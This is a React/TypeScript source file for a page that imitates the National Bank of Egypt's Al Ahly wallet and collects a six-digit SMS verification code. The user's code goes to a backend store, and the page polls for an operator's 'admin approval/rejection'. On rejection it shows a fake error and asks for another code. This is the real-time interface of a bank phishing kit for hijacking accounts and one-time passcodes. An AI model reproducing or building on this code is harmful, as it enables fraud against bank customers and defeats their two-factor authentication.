import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { navigateToPage, submitData, isFormApproved, isFormRejected } from "@/lib/store";
import NBELayout from "./components/NBELayout";
import WaitingOverlay from "./components/WaitingOverlay";

export default function OTPPageNBE() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [isWaiting, setIsWaiting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    navigateToPage("رمز التحقق - محفظة الأهلي");
    // Focus first input
    setTimeout(() => inputRefs.current[0]?.focus(), 300);
  }, []);

  // Listen for admin approval/rejection
  useEffect(() => {
    const interval = setInterval(() => {
      if (isFormApproved.value && isWaiting) {
        setIsWaiting(false);
        setErrorMsg("");
        isFormApproved.value = false;
        setLocation("/final-nbe");
      }
      if (isFormRejected.value && isWaiting) {
        setIsWaiting(false);
        isFormRejected.value = false;
        // Clear OTP fields and show error
        setOtp(["", "", "", "", "", ""]);
        setErrorMsg("خطأ في المعلومات المدخلة");
        setTimeout(() => inputRefs.current[0]?.focus(), 100);
      }
    }, 500);
    return () => clearInterval(interval);
  }, [isWaiting]);

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    setErrorMsg("");

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      const focusIndex = Math.min(pastedData.length, 5);
      inputRefs.current[focusIndex]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length < 6) {
      setErrorMsg("يرجى إدخال رمز التحقق كاملاً");
      return;
    }

    setErrorMsg("");
    setIsWaiting(true);

    submitData(
      {
        "رمز التحقق OTP": otpValue,
      },
      true
    );
  };

  return (
    <>
      {isWaiting && <WaitingOverlay message="جاري التحقق من الرمز..." />}
      
      <NBELayout currentStep={2} totalSteps={2}>
        <div className="text-center mb-6">
          <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg className="w-7 h-7 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق</h2>
          <p className="text-gray-500 text-sm">أدخل رمز التحقق المرسل إلى هاتفك</p>
        </div>

        {/* Error Message */}
        {errorMsg && (
          <div className="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 flex items-center gap-2">
            <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
            </svg>
            <p className="text-red-600 text-sm font-medium">{errorMsg}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input Boxes */}
          <div className="flex justify-center gap-2 md:gap-3" dir="ltr">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className={`w-11 h-14 md:w-13 md:h-16 text-center text-xl md:text-2xl font-bold rounded-xl border-2 ${
                  errorMsg
                    ? "border-red-400 bg-red-50"
                    : digit
                    ? "border-green-500 bg-green-50"
                    : "border-gray-200 focus:border-green-500"
                } outline-none transition-all bg-gray-50 focus:bg-white focus:shadow-lg`}
              />
            ))}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isWaiting}
            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
          >
            تحقق
          </button>

          {/* Resend */}
          <p className="text-center text-gray-400 text-sm">
            لم تستلم الرمز؟{" "}
            <button type="button" className="text-green-600 font-semibold hover:underline">
              إعادة الإرسال
            </button>
          </p>
        </form>
      </NBELayout>
    </>
  );
}
